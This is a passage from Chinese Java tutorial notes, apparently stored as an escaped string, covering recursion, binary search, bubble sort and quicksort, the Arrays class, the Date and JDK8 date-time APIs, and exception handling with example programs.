98之间的和)\n                          //....\n                              //1\n          //方法的作用: 求 1- i 之间和\n          if(i == 1){\n              return 1;\n          }else{\n              return i + getSum(i -1);\n          }\n      }\n  }    \n  ```\n\n- 递归的注意事项\n\n  - 递归一定要有出口。否则内存溢出\n  - 递归虽然有出口，但是递归的次数也不宜过多。否则内存溢出\n\n### 4.2 递归求阶乘【应用】\n\n- 案例需求\n\n  ​\t用递归求5的阶乘，并把结果在控制台输出\n\n- 代码实现\n\n  ```java\n  public class DiGuiDemo01 {\n      public static void main(String[] args) {\n          //调用方法\n          int result = jc(5);\n          //输出结果\n          System.out.println("5的阶乘是：" + result);\n      }\n\n      //定义一个方法，用于递归求阶乘，参数为一个int类型的变量\n      public static int jc(int n) {\n          //在方法内部判断该变量的值是否是1\n          if(n == 1) {\n              //是：返回1\n              return 1;\n          } else {\n              //不是：返回n*(n-1)!\n              return n*jc(n-1);\n          }\n      }\n  }\n  ```\n\n- 内存图\n\n  ![08_递归内存图](./img/java/basics/day14-常用API01.img/08_递归内存图.png)\n\n## 5.数组的高级操作 \n\n### 5.1 二分查找 (理解)\n\n+ 二分查找概述\n\n  查找指定元素在数组中的位置时,以前的方式是通过遍历,逐个获取每个元素,看是否是要查找的元素,这种方式当数组元素较多时,查找的效率很低\n\n  二分查找也叫折半查找,每次可以去掉一半的查找范围,从而提高查找的效率\n\n\n+ 需求\n\n  在数组{1,2,3,4,5,6,7,8,9,10}中,查找某个元素的位置\n\n+ 实现步骤\n\n  1. 定义两个变量，表示要查找的范围。默认min = 0 ，max = 最大索引\n  2. 循环查找，但是min <= max\n  3. 计算出mid的值\n  4. 判断mid位置的元素是否为要查找的元素，如果是直接返回对应索引\n  5. 如果要查找的值在mid的左半边，那么min值不变，max = mid -1.继续下次循环查找\n  6. 如果要查找的值在mid的右半边，那么max值不变，min = mid + 1.继续下次循环查找\n  7. 当min > max 时，表示要查找的元素在数组中不存在，返回-1.\n\n+ 代码实现\n\n  ```java\n  public class MyBinarySearchDemo {\n      public static void main(String[] args) {\n          int [] arr = {1,2,3,4,5,6,7,8,9,10};\n          int number = 11;\n\n          //1,我现在要干嘛? --- 二分查找\n          //2.我干这件事情需要什么? --- 数组 元素\n          //3,我干完了,要不要把结果返回调用者 --- 把索引返回给调用者\n          int index = binarySearchForIndex(arr,number);\n          System.out.println(index);\n      }\n\n      private static int binarySearchForIndex(int[] arr, int number) {\n          //1,定义查找的范围\n          int min = 0;\n          int max = arr.length - 1;\n          //2.循环查找 min <= max\n          while(min <= max){\n              //3.计算出中间位置 mid\n              int mid = (min + max) >> 1;\n              //mid指向的元素 > number\n              if(arr[mid] > number){\n                  //表示要查找的元素在左边.\n                  max = mid -1;\n              }else if(arr[mid] < number){\n                  //mid指向的元素 < number\n                  //表示要查找的元素在右边.\n                  min = mid + 1;\n              }else{\n                  //mid指向的元素 == number\n                  return mid;\n              }\n          }\n          //如果min大于了max就表示元素不存在,返回-1.\n          return -1;\n      }\n    \n  }\n  ```\n\n+ 注意事项\n\n  有一个前提条件，数组内的元素一定要按照大小顺序排列，如果没有大小顺序，是不能使用二分查找法的\n\n### 5.2 冒泡排序 (理解)\n\n+ 冒泡排序概述\n\n  一种排序的方式，对要进行排序的数据中相邻的数据进行两两比较，将较大的数据放在后面，依次对所有的数据进行操作，直至所有数据按要求完成排序\n\n  如果有n个数据进行排序，总共需要比较n-1次\n\n  每一次比较完毕，下一次的比较就会少一个数据参与\n\n+ 代码实现\n\n  ```java\n  public class MyBubbleSortDemo2 {\n      public static void main(String[] args) {\n          int[] arr = {3, 5, 2, 1, 4};\n          //1 2 3 4 5\n          bubbleSort(arr);\n      }\n\n      private static void bubbleSort(int[] arr) {\n          //外层循环控制的是次数 比数组的长度少一次.\n          for (int i = 0; i < arr.length -1; i++) {\n              //内存循环就是实际循环比较的\n              //-1 是为了让数组不要越界\n              //-i 每一轮结束之后,我们就会少比一个数字.\n              for (int j = 0; j < arr.length - 1 - i; j++) {\n                  if (arr[j] > arr[j + 1]) {\n                      int temp = arr[j];\n                      arr[j] = arr[j + 1];\n                      arr[j + 1] = temp;\n                  }\n              }\n          }\n\n          printArr(arr);\n      }\n\n      private static void printArr(int[] arr) {\n          for (int i = 0; i < arr.length; i++) {\n              System.out.print(arr[i] + " ");\n          }\n          System.out.println();\n      }\n    \n  }\n  ```\n\n### 5.3 快速排序 (理解)\n\n+ 快速排序概述\n\n  冒泡排序算法中,一次循环结束,就相当于确定了当前的最大值,也能确定最大值在数组中应存入的位置\n\n  快速排序算法中,每一次递归时以第一个数为基准数,找到数组中所有比基准数小的.再找到所有比基准数大的.小的全部放左边,大的全部放右边,确定基准数的正确位置\n\n+ 核心步骤\n\n  1. 从右开始找比基准数小的\n  2. 从左开始找比基准数大的\n  3. 交换两个值的位置\n  4. 红色继续往左找，蓝色继续往右找，直到两个箭头指向同一个索引为止\n  5. 基准数归位\n\n+ 代码实现\n\n  ```java\n  public class MyQuiteSortDemo2 {\n      public static void main(String[] args) {\n  //        1，从右开始找比基准数小的\n  //        2，从左开始找比基准数大的\n  //        3，交换两个值的位置\n  //        4，红色继续往左找，蓝色继续往右找，直到两个箭头指向同一个索引为止\n  //        5，基准数归位\n          int[] arr = {6, 1, 2, 7, 9, 3, 4, 5, 10, 8};\n\n          quiteSort(arr,0,arr.length-1);\n\n          for (int i = 0; i < arr.length; i++) {\n              System.out.print(arr[i] + " ");\n          }\n      }\n\n      private static void quiteSort(int[] arr, int left, int right) {\n       \t// 递归结束的条件\n          if(right < left){\n              return;\n          }\n\n          int left0 = left;\n          int right0 = right;\n\n          //计算出基准数\n          int baseNumber = arr[left0];\n\n          while(left != right){\n  //        1，从右开始找比基准数小的\n              while(arr[right] >= baseNumber && right > left){\n                  right--;\n              }\n  //        2，从左开始找比基准数大的\n              while(arr[left] <= baseNumber && right > left){\n                  left++;\n              }\n  //        3，交换两个值的位置\n              int temp = arr[left];\n              arr[left] = arr[right];\n              arr[right] = temp;\n          }\n          //基准数归位\n          int temp = arr[left];\n          arr[left] = arr[left0];\n          arr[left0] = temp;\n        \n  \t\t// 递归调用自己,将左半部分排好序\n          quiteSort(arr,left0,left-1);\n        \t// 递归调用自己,将右半部分排好序\n          quiteSort(arr,left +1,right0);\n\n      }\n  }\n  ```\n\n### 5.4 Arrays (应用)\n\n- Arrays的常用方法\n\n  | 方法名                                      | 说明                |\n  | ---------------------------------------- | ----------------- |\n  | public static String toString(int[] a)   | 返回指定数组的内容的字符串表示形式 |\n  | public static void sort(int[] a)         | 按照数字顺序排列指定的数组     |\n  | public static int binarySearch(int[] a, int key) | 利用二分查找返回指定元素的索引   |\n\n- 示例代码\n\n  ```java\n  public class MyArraysDemo {\n        public static void main(String[] args) {\n    //        public static String toString(int[] a)    返回指定数组的内容的字符串表示形式\n    //        int [] arr = {3,2,4,6,7};\n    //        System.out.println(Arrays.toString(arr));\n\n    //        public static void sort(int[] a)\t  按照数字顺序排列指定的数组\n    //        int [] arr = {3,2,4,6,7};\n    //        Arrays.sort(arr);\n    //        System.out.println(Arrays.toString(arr));\n\n    //        public static int binarySearch(int[] a, int key) 利用二分查找返回指定元素的索引\n            int [] arr = {1,2,3,4,5,6,7,8,9,10};\n            int index = Arrays.binarySearch(arr, 0);\n            System.out.println(index);\n            //1,数组必须有序\n            //2.如果要查找的元素存在,那么返回的是这个元素实际的索引\n            //3.如果要查找的元素不存在,那么返回的是 (-插入点-1)\n                //插入点:如果这个元素在数组中,他应该在哪个索引上.\n        }\n    }\n  ```\n\n- 工具类设计思想\n\n  1. 构造方法用 private 修饰\n  2. 成员用 public static 修饰\n\n\n\n',dn='## 1.时间日期类\n\n### 1.1 Date类（应用）\n\n+ 计算机中时间原点\n\n  1970年1月1日 00:00:00\n\n+ 时间换算单位\n\n  1秒 = 1000毫秒\n\n+ Date类概述\n\n  Date 代表了一个特定的时间，精确到毫秒\n\n+ Date类构造方法\n\n  | 方法名                    | 说明                                  |\n  | ---------------------- | ----------------------------------- |\n  | public Date()          | 分配一个 Date对象，并初始化，以便它代表它被分配的时间，精确到毫秒 |\n  | public Date(long date) | 分配一个 Date对象，并将其初始化为表示从标准基准时间起指定的毫秒数 |\n\n+ 示例代码\n\n  ```java\n  public class DateDemo01 {\n      public static void main(String[] args) {\n          //public Date()：分配一个 Date对象，并初始化，以便它代表它被分配的时间，精确到毫秒\n          Date d1 = new Date();\n          System.out.println(d1);\n\n          //public Date(long date)：分配一个 Date对象，并将其初始化为表示从标准基准时间起指定的毫秒数\n          long date = 1000*60*60;\n          Date d2 = new Date(date);\n          System.out.println(d2);\n      }\n  }\n  ```\n\n### 1.2 Date类常用方法（应用）\n\n- 常用方法\n\n  | 方法名                            | 说明                                 |\n  | ------------------------------ | ---------------------------------- |\n  | public long getTime()          | 获取的是日期对象从1970年1月1日 00:00:00到现在的毫秒值 |\n  | public void setTime(long time) | 设置时间，给的是毫秒值                        |\n\n- 示例代码\n\n  ```java\n  public class DateDemo02 {\n      public static void main(String[] args) {\n          //创建日期对象\n          Date d = new Date();\n\n          //public long getTime():获取的是日期对象从1970年1月1日 00:00:00到现在的毫秒值\n  //        System.out.println(d.getTime());\n  //        System.out.println(d.getTime() * 1.0 / 1000 / 60 / 60 / 24 / 365 + "年");\n\n          //public void setTime(long time):设置时间，给的是毫秒值\n  //        long time = 1000*60*60;\n          long time = System.currentTimeMillis();\n          d.setTime(time);\n\n          System.out.println(d);\n      }\n  }\n  ```\n\n### 1.3 SimpleDateFormat类（应用）\n\n- SimpleDateFormat类概述\n\n  ​\tSimpleDateFormat是一个具体的类，用于以区域设置敏感的方式格式化和解析日期。\n\n  ​\t我们重点学习日期格式化和解析\n\n- SimpleDateFormat类构造方法\n\n  | 方法名                                     | 说明                                  |\n  | --------------------------------------- | ----------------------------------- |\n  | public   SimpleDateFormat()             | 构造一个SimpleDateFormat，使用默认模式和日期格式    |\n  | public SimpleDateFormat(String pattern) | 构造一个SimpleDateFormat使用给定的模式和默认的日期格式 |\n\n- SimpleDateFormat类的常用方法\n\n  - 格式化(从Date到String)\n    - public final String format(Date date)：将日期格式化成日期/时间字符串\n  - 解析(从String到Date)\n    - public Date parse(String source)：从给定字符串的开始解析文本以生成日期\n\n- 示例代码\n\n  ```java\n  public class SimpleDateFormatDemo {\n      public static void main(String[] args) throws ParseException {\n          //格式化：从 Date 到 String\n          Date d = new Date();\n  //        SimpleDateFormat sdf = new SimpleDateFormat();\n          SimpleDateFormat sdf = new SimpleDateFormat("yyyy年MM月dd日 HH:mm:ss");\n          String s = sdf.format(d);\n          System.out.println(s);\n          System.out.println("--------");\n\n          //从 String 到 Date\n          String ss = "2048-08-09 11:11:11";\n          //ParseException\n          SimpleDateFormat sdf2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");\n          Date dd = sdf2.parse(ss);\n          System.out.println(dd);\n      }\n  }\n  ```\n\n### 1.4 时间日期类练习 (应用) \n\n+ 需求\n\n  秒杀开始时间是2020年11月11日 00:00:00,结束时间是2020年11月11日 00:10:00,用户小贾下单时间是2020年11月11日 00:03:47,用户小皮下单时间是2020年11月11日 00:10:11,判断用户有没有成功参与秒杀活动\n\n+ 实现步骤\n\n  1. 判断下单时间是否在开始到结束的范围内\n  2. 把字符串形式的时间变成毫秒值\n\n+ 代码实现\n\n  ```java\n  public class DateDemo5 {\n      public static void main(String[] args) throws ParseException {\n          //开始时间：2020年11月11日 0:0:0\n          //结束时间：2020年11月11日 0:10:0\n\n          //小贾2020年11月11日 0:03:47\n          //小皮2020年11月11日 0:10:11\n\n          //1.判断两位同学的下单时间是否在范围之内就可以了。\n\n          //2.要把每一个时间都换算成毫秒值。\n\n          String start = "2020年11月11日 0:0:0";\n          String end = "2020年11月11日 0:10:0";\n\n          String jia = "2020年11月11日 0:03:47";\n          String pi = "2020年11月11日 0:10:11";\n\n          SimpleDateFormat sdf = new SimpleDateFormat("yyyy年MM月dd日 HH:mm:ss");\n          long startTime = sdf.parse(start).getTime();\n          long endTime = sdf.parse(end).getTime();\n\n  //        System.out.println(startTime);\n  //        System.out.println(endTime);\n          long jiaTime = sdf.parse(jia).getTime();\n          long piTime = sdf.parse(pi).getTime();\n\n          if(jiaTime >= startTime && jiaTime <= endTime){\n              System.out.println("小贾同学参加上了秒杀活动");\n          }else{\n              System.out.println("小贾同学没有参加上秒杀活动");\n          }\n\n          System.out.println("------------------------");\n\n          if(piTime >= startTime && piTime <= endTime){\n              System.out.println("小皮同学参加上了秒杀活动");\n          }else{\n              System.out.println("小皮同学没有参加上秒杀活动");\n          }\n\n      }\n    \n  }\n  ```\n\n## 2.JDK8时间日期类 \n\n### 2.1 JDK8新增日期类 (理解) \n\n+ LocalDate       表示日期（年月日）  \n+ LocalTime       表示时间（时分秒）\n+ LocalDateTime    表示时间+ 日期 （年月日时分秒）\n\n### 2.2 LocalDateTime创建方法 (应用) \n\n+ 方法说明\n\n  | 方法名                                      | 说明                              |\n  | ---------------------------------------- | ------------------------------- |\n  | public static LocalDateTime now()        | 获取当前系统时间                        |\n  | public static LocalDateTime of  (年, 月 , 日, 时, 分, 秒) | 使用指定年月日和时分秒初始化一个LocalDateTime对象 |\n\n+ 示例代码\n\n  ```java\n  public class JDK8DateDemo2 {\n      public static void main(String[] args) {\n          LocalDateTime now = LocalDateTime.now();\n          System.out.println(now);\n\n          LocalDateTime localDateTime = LocalDateTime.of(2020, 11, 11, 11, 11, 11);\n          System.out.println(localDateTime);\n      }\n  }\n  ```\n\n### 2.3 LocalDateTime获取方法 (应用)\n\n+ 方法说明\n\n  | 方法名                             | 说明               |\n  | ------------------------------- | ---------------- |\n  | public int getYear()            | 获取年              |\n  | public int getMonthValue()      | 获取月份（1-12）       |\n  | public int getDayOfMonth()      | 获取月份中的第几天（1-31）  |\n  | public int getDayOfYear()       | 获取一年中的第几天（1-366） |\n  | public DayOfWeek getDayOfWeek() | 获取星期             |\n  | public int getMinute()          | 获取分钟             |\n  | public int getHour()            | 获取小时             |\n\n+ 示例代码\n\n  ```java\n  public class JDK8DateDemo3 {\n      public static void main(String[] args) {\n          LocalDateTime localDateTime = LocalDateTime.of(2020, 11, 11, 11, 11, 20);\n          //public int getYear()           获取年\n          int year = localDateTime.getYear();\n          System.out.println("年为" +year);\n          //public int getMonthValue()     获取月份（1-12）\n          int month = localDateTime.getMonthValue();\n          System.out.println("月份为" + month);\n\n          Month month1 = localDateTime.getMonth();\n  //        System.out.println(month1);\n\n          //public int getDayOfMonth()     获取月份中的第几天（1-31）\n          int day = localDateTime.getDayOfMonth();\n          System.out.println("日期为" + day);\n\n          //public int getDayOfYear()      获取一年中的第几天（1-366）\n          int dayOfYear = localDateTime.getDayOfYear();\n          System.out.println("这是一年中的第" + dayOfYear + "天");\n\n          //public DayOfWeek getDayOfWeek()获取星期\n          DayOfWeek dayOfWeek = localDateTime.getDayOfWeek();\n          System.out.println("星期为" + dayOfWeek);\n\n          //public int getMinute()        获取分钟\n          int minute = localDateTime.getMinute();\n          System.out.println("分钟为" + minute);\n          //public int getHour()           获取小时\n    \n          int hour = localDateTime.getHour();\n          System.out.println("小时为" + hour);\n      }\n  }\n  ```\n\n### 2.4 LocalDateTime转换方法 (应用)\n\n+ 方法说明\n\n  | 方法名                              | 说明                |\n  | -------------------------------- | ----------------- |\n  | public LocalDate  toLocalDate () | 转换成为一个LocalDate对象 |\n  | public LocalTime toLocalTime ()  | 转换成为一个LocalTime对象 |\n\n+ 示例代码\n\n  ```java\n  public class JDK8DateDemo4 {\n      public static void main(String[] args) {\n          LocalDateTime localDateTime = LocalDateTime.of(2020, 12, 12, 8, 10, 12);\n          //public LocalDate toLocalDate ()    转换成为一个LocalDate对象\n          LocalDate localDate = localDateTime.toLocalDate();\n          System.out.println(localDate);\n\n          //public LocalTime toLocalTime ()    转换成为一个LocalTime对象\n          LocalTime localTime = localDateTime.toLocalTime();\n          System.out.println(localTime);\n      }\n  }\n  ```\n\n### 2.5 LocalDateTime格式化和解析 (应用)\n\n+ 方法说明\n\n  | 方法名                                      | 说明                                     |\n  | ---------------------------------------- | -------------------------------------- |\n  | public String format (指定格式)              | 把一个LocalDateTime格式化成为一个字符串             |\n  | public LocalDateTime parse (准备解析的字符串, 解析格式) | 把一个日期字符串解析成为一个LocalDateTime对象          |\n  | public static DateTimeFormatter ofPattern(String pattern) | 使用指定的日期模板获取一个日期格式化器DateTimeFormatter对象 |\n\n+ 示例代码\n\n  ```java\n  public class JDK8DateDemo5 {\n      public static void main(String[] args) {\n          //method1();\n          //method2();\n      }\n\n      private static void method2() {\n          //public static LocalDateTime parse (准备解析的字符串, 解析格式) 把一个日期字符串解析成为一个LocalDateTime对象\n          String s = "2020年11月12日 13:14:15";\n          DateTimeFormatter pattern = DateTimeFormatter.ofPattern("yyyy年MM月dd日 HH:mm:ss");\n          LocalDateTime parse = LocalDateTime.parse(s, pattern);\n          System.out.println(parse);\n      }\n\n      private static void method1() {\n          LocalDateTime localDateTime = LocalDateTime.of(2020, 11, 12, 13, 14, 15);\n          System.out.println(localDateTime);\n          //public String format (指定格式)   把一个LocalDateTime格式化成为一个字符串\n          DateTimeFormatter pattern = DateTimeFormatter.ofPattern("yyyy年MM月dd日 HH:mm:ss");\n          String s = localDateTime.format(pattern);\n          System.out.println(s);\n      }\n  }\n  ```\n\n### 2.6 LocalDateTime增加或者减少时间的方法 (应用)\n\n+ 方法说明\n\n  | 方法名                                      | 说明      |\n  | ---------------------------------------- | ------- |\n  | public LocalDateTime plusYears (long years) | 添加或者减去年 |\n  | public LocalDateTime plusMonths(long months) | 添加或者减去月 |\n  | public LocalDateTime plusDays(long days) | 添加或者减去日 |\n  | public LocalDateTime plusHours(long hours) | 添加或者减去时 |\n  | public LocalDateTime plusMinutes(long minutes) | 添加或者减去分 |\n  | public LocalDateTime plusSeconds(long seconds) | 添加或者减去秒 |\n  | public LocalDateTime plusWeeks(long weeks) | 添加或者减去周 |\n\n+ 示例代码\n\n  ```java\n  /**\n   * JDK8 时间类添加或者减去时间的方法\n   */\n  public class JDK8DateDemo6 {\n      public static void main(String[] args) {\n          //public LocalDateTime plusYears (long years)   添加或者减去年\n\n          LocalDateTime localDateTime = LocalDateTime.of(2020, 11, 11, 13, 14, 15);\n          //LocalDateTime newLocalDateTime = localDateTime.plusYears(1);\n          //System.out.println(newLocalDateTime);\n\n          LocalDateTime newLocalDateTime = localDateTime.plusYears(-1);\n          System.out.println(newLocalDateTime);\n      }\n  }\n  ```\n\n### 2.7 LocalDateTime减少或者增加时间的方法 (应用)\n\n+ 方法说明\n\n  | 方法名                                      | 说明      |\n  | ---------------------------------------- | ------- |\n  | public LocalDateTime  minusYears (long years) | 减去或者添加年 |\n  | public LocalDateTime  minusMonths(long months) | 减去或者添加月 |\n  | public LocalDateTime minusDays(long days) | 减去或者添加日 |\n  | public LocalDateTime minusHours(long hours) | 减去或者添加时 |\n  | public LocalDateTime minusMinutes(long minutes) | 减去或者添加分 |\n  | public LocalDateTime minusSeconds(long seconds) | 减去或者添加秒 |\n  | public LocalDateTime minusWeeks(long weeks) | 减去或者添加周 |\n\n+ 示例代码\n\n  ```java\n  /**\n   * JDK8 时间类减少或者添加时间的方法\n   */\n  public class JDK8DateDemo7 {\n      public static void main(String[] args) {\n          //public LocalDateTime minusYears (long years)  减去或者添加年\n          LocalDateTime localDateTime = LocalDateTime.of(2020, 11, 11, 13, 14, 15);\n          //LocalDateTime newLocalDateTime = localDateTime.minusYears(1);\n          //System.out.println(newLocalDateTime);\n\n          LocalDateTime newLocalDateTime = localDateTime.minusYears(-1);\n          System.out.println(newLocalDateTime);\n\n      }\n  }\n  ```\n\n### 2.8 LocalDateTime修改方法 (应用)\n\n+ 方法说明\n\n  | 方法名                                      | 说明               |\n  | ---------------------------------------- | ---------------- |\n  | public LocalDateTime withYear(int year)  | 直接修改年            |\n  | public LocalDateTime withMonth(int month) | 直接修改月            |\n  | public LocalDateTime withDayOfMonth(int dayofmonth) | 直接修改日期(一个月中的第几天) |\n  | public LocalDateTime withDayOfYear(int dayOfYear) | 直接修改日期(一年中的第几天)  |\n  | public LocalDateTime withHour(int hour)  | 直接修改小时           |\n  | public LocalDateTime withMinute(int minute) | 直接修改分钟           |\n  | public LocalDateTime withSecond(int second) | 直接修改秒            |\n\n+ 示例代码\n\n  ```java\n  /**\n   * JDK8 时间类修改时间\n   */\n  public class JDK8DateDemo8 {\n      public static void main(String[] args) {\n          //public LocalDateTime withYear(int year)   修改年\n          LocalDateTime localDateTime = LocalDateTime.of(2020, 11, 11, 13, 14, 15);\n         // LocalDateTime newLocalDateTime = localDateTime.withYear(2048);\n         // System.out.println(newLocalDateTime);\n\n          LocalDateTime newLocalDateTime = localDateTime.withMonth(20);\n          System.out.println(newLocalDateTime);\n\n      }\n  }\n  ```\n\n### 2.9 Period (应用)\n\n+ 方法说明\n\n  | 方法名                                     | 说明          |\n  | --------------------------------------- | ----------- |\n  | public static Period between(开始时间,结束时间) | 计算两个“时间"的间隔 |\n  | public int getYears()                   | 获得这段时间的年数   |\n  | public int getMonths()                  | 获得此期间的总月数   |\n  | public int getDays()                    | 获得此期间的天数    |\n  | public long toTotalMonths()             | 获取此期间的总月数   |\n\n+ 示例代码\n\n  ```java\n  /**\n   *  计算两个时间的间隔\n   */\n  public class JDK8DateDemo9 {\n      public static void main(String[] args) {\n          //public static Period between(开始时间,结束时间)  计算两个"时间"的间隔\n\n          LocalDate localDate1 = LocalDate.of(2020, 1, 1);\n          LocalDate localDate2 = LocalDate.of(2048, 12, 12);\n          Period period = Period.between(localDate1, localDate2);\n          System.out.println(period);//P28Y11M11D\n\n          //public int getYears()         获得这段时间的年数\n          System.out.println(period.getYears());//28\n          //public int getMonths()        获得此期间的月数\n          System.out.println(period.getMonths());//11\n          //public int getDays()          获得此期间的天数\n          System.out.println(period.getDays());//11\n\n          //public long toTotalMonths()   获取此期间的总月数\n          System.out.println(period.toTotalMonths());//347\n\n      }\n  }\n  ```\n\n### 2.10 Duration (应用)\n\n+ 方法说明\n\n  | 方法名                                      | 说明          |\n  | ---------------------------------------- | ----------- |\n  | public static Durationbetween(开始时间,结束时间) | 计算两个“时间"的间隔 |\n  | public long toSeconds()                  | 获得此时间间隔的秒   |\n  | public int toMillis()                    | 获得此时间间隔的毫秒  |\n  | public int toNanos()                     | 获得此时间间隔的纳秒  |\n\n+ 示例代码\n\n  ```java\n  /**\n   *  计算两个时间的间隔\n   */\n  public class JDK8DateDemo10 {\n      public static void main(String[] args) {\n          //public static Duration between(开始时间,结束时间)  计算两个“时间"的间隔\n\n          LocalDateTime localDateTime1 = LocalDateTime.of(2020, 1, 1, 13, 14, 15);\n          LocalDateTime localDateTime2 = LocalDateTime.of(2020, 1, 2, 11, 12, 13);\n          Duration duration = Duration.between(localDateTime1, localDateTime2);\n          System.out.println(duration);//PT21H57M58S\n          //public long toSeconds()\t       获得此时间间隔的秒\n          System.out.println(duration.toSeconds());//79078\n          //public int toMillis()\t           获得此时间间隔的毫秒\n          System.out.println(duration.toMillis());//79078000\n          //public int toNanos()             获得此时间间隔的纳秒\n          System.out.println(duration.toNanos());//79078000000000\n      }\n  }\n  ```\n\n## 3.异常\n\n### 3.1 异常（记忆）\n\n- 异常的概述\n\n  ​\t异常就是程序出现了不正常的情况\n\n- 异常的体系结构\n\n  ![01_异常体系结构](./img/java/basics/day15-常用API02.img/01_异常体系结构.png)\n\n### 3.2 编译时异常和运行时异常的区别（记忆）\n\n- 编译时异常\n\n  - 都是Exception类及其子类\n  - 必须显示处理，否则程序就会发生错误，无法通过编译\n\n- 运行时异常\n\n  - 都是RuntimeException类及其子类\n  - 无需显示处理，也可以和编译时异常一样处理\n\n- 图示\n\n  ![02_编译时异常和运行时异常](./img/java/basics/day15-常用API02.img/02_编译时异常和运行时异常.png)\n\n### 3.3 JVM默认处理异常的方式（理解）\n\n- 如果程序出现了问题，我们没有做任何处理，最终JVM 会做默认的处理，处理方式有如下两个步骤：\n  - 把异常的名称，错误原因及异常出现的位置等信息输出在了控制台\n  - 程序停止执行\n\n### 3.4 查看异常信息 (理解) \n\n控制台在打印异常信息时,会打印异常类名,异常出现的原因,异常出现的位置\n\n我们调bug时,可以根据提示,找到异常出现的位置,分析原因,修改异常代码\n\n![03_查看异常信息](./img/java/basics/day15-常用API02.img/03_查看异常信息.png)\n\n### 3.5 throws方式处理异常（应用）\n\n- 定义格式\n\n  ```java\n  public void 方法() throws 异常类名 {\n      \n  }\n  ```\n\n- 示例代码\n\n  ```java\n  public class ExceptionDemo {\n      public static void main(String[] args) throws ParseException{\n          System.out.println("开始");\n  //        method();\n            method2();\n\n          System.out.println("结束");\n      }\n\n      //编译时异常\n      public static void method2() throws ParseException {\n          String s = "2048-08-09";\n          SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");\n          Date d = sdf.parse(s);\n          System.out.println(d);\n      }\n\n      //运行时异常\n      public static void method() throws ArrayIndexOutOfBoundsException {\n          int[] arr = {1, 2, 3};\n          System.out.println(arr[3]);\n      }\n  }\n  ```\n\n- 注意事项\n\n  - 这个throws格式是跟在方法的括号后面的\n  - 编译时异常必须要进行处理，两种处理方案：try...catch …或者 throws，如果采用 throws 这种方案，在方法上进行显示声明,将来谁调用这个方法谁处理\n  - 运行时异常因为在运行时才会发生,所以在方法后面可以不写,运行时出现异常默认交给jvm处理\n\n### 3.6 throw抛出异常 (应用) \n\n+ 格式\n\n  throw new 异常();\n\n+ 注意\n\n  这个格式是在方法内的，表示当前代码手动抛出一个异常，下面的代码不用再执行了\n\n+ throws和throw的区别\n\n  | throws                  | throw                 |\n  | ----------------------- | --------------------- |\n  | 用在方法声明后面，跟的是异常类名        | 用在方法体内，跟的是异常对象名       |\n  | 表示声明异常，调用该方法有可能会出现这样的异常 | 表示手动抛出异常对象，由方法体内的语句处理 |\n\n+ 示例代码\n\n  ```java\n  public class ExceptionDemo8 {\n      public static void main(String[] args) {\n          //int [] arr = {1,2,3,4,5};\n          int [] arr = null;\n          printArr(arr);//就会 接收到一个异常.\n                          //我们还需要自己处理一下异常.\n      }\n\n      private static void printArr(int[] arr) {\n          if(arr == null){\n              //调用者知道成功打印了吗?\n              //System.out.println("参数不能为null");\n              throw new NullPointerException(); //当参数为null的时候\n                                              //手动创建了一个异常对象,抛给了调用者,产生了一个异常\n          }else{\n              for (int i = 0; i < arr.length; i++) {\n                  System.out.println(arr[i]);\n              }\n          }\n      }\n\n  }\n  ```\n\n### 3.7 try-catch方式处理异常（应用）\n\n- 定义格式\n\n  ```java\n  try {\n  \t可能出现异常的代码;\n  } catch(异常类名 变量名) {\n  \t异常的处理代码;\n  }\n  ```\n\n- 执行流程\n\n  - 程序从 try 里面的代码开始执行\n  - 出现异常，就会跳转到对应的 catch 里面去执行\n  - 执行完毕之后，程序还可以继续往下执行\n\n- 示例代码\n\n  ```java\n  public class ExceptionDemo01 {\n      public static void main(String[] args) {\n          System.out.println("开始");\n          method();\n          System.out.println("结束");\n      }\n\n      public static void method() {\n          try {\n              int[] arr = {1, 2, 3};\n              System.out.println(arr[3]);\n              System.out.println("这里能够访问到吗");\n          } catch (ArrayIndexOutOfBoundsException e) {\n              System.out.println("你访问的数组索引不存在，请回去修改为正确的索引");\n          }\n      }\n  }\n  ```\n\n- 注意\n\n  1. 如果 try 中没有遇到问题，怎么执行？\n\n     会把try中所有的代码全部执行完毕,不会执行catch里面的代码\n\n  2. 如果 try 中遇到了问题，那么 try 下面的代码还会执行吗？\n\n     那么直接跳转到对应的catch语句中,try下面的代码就不会再执行了\n     当catch里面的语句全部执行完毕,表示整个体系全部执行完全,继续执行下面的代码\n\n  3. 如果出现的问题没有被捕获，那么程序如何运行？\n\n     那么try...catch就相当于没有写.那么也就是自己没有处理.\n     默认交给虚拟机处理.\n\n  4. 同时有可能出现多个异常怎么处理？\n\n     出现多个异常,那么就写多个catch就可以了.\n     注意点:如果多个异常之间存在子父类关系.那么父类一定要写在下面\n\n### 3.8 Throwable成员方法（应用）\n\n- 常用方法\n\n  | 方法名                           | 说明                     |\n  | ----------------------------- | ---------------------- |\n  | public String getMessage()    | 返回此 throwable 的详细消息字符串 |\n  | public String toString()      | 返回此可抛出的简短描述            |\n  | public void printStackTrace() | 把异常的错误信息输出在控制台         |\n\n- 示例代码\n\n  ```java\n  public class ExceptionDemo02 {\n      public static void main(String[] args) {\n          System.out.println("开始");\n          method();\n          System.out.println("结束");\n      }\n\n      public static void method() {\n          try {\n              int[] arr = {1, 2, 3};\n              System.out.println(arr[3]); //new ArrayIndexOutOfBoundsException();\n              System.out.println("这里能够访问到吗");\n          } catch (ArrayIndexOutOfBoundsException e) { //new ArrayIndexOutOfBoundsException();\n  //            e.printStackTrace();\n\n              //public String getMessage():返回此 throwable 的详细消息字符串\n  //            System.out.println(e.getMessage());\n              //Index 3 out of bounds for length 3\n\n              //public String toString():返回此可抛出的简短描述\n  //            System.out.println(e.toString());\n              //java.lang.ArrayIndexOutOfBoundsException: Index 3 out of bounds for length 3\n\n              //public void printStackTrace():把异常的错误信息输出在控制台\n              e.printStackTrace();\n  //            java.lang.ArrayIndexOutOfBoundsException: Index 3 out of bounds for length 3\n  //            at com.itheima_02.ExceptionDemo02.method(ExceptionDemo02.java:18)\n  //            at com.itheima_02.ExceptionDemo02.main(ExceptionDemo02.java:11)\n\n          }\n      }\n  }\n  ```\n\n### 3.9 异常的练习 (应用) \n\n+ 需求\n\n  键盘录入学生的姓名和年龄,其中年龄为18 - 25岁,超出这个范围是异常数据不能赋值.需要重新录入,一直录到正确为止\n\n+ 实现步骤\n\n  1. 创建学生对象\n  2. 键盘录入姓名和年龄，并赋值给学生对象\n  3. 如果是非法数据就再次录入\n\n+ 代码实现\n\n  学生类\n\n  ```java\n  public 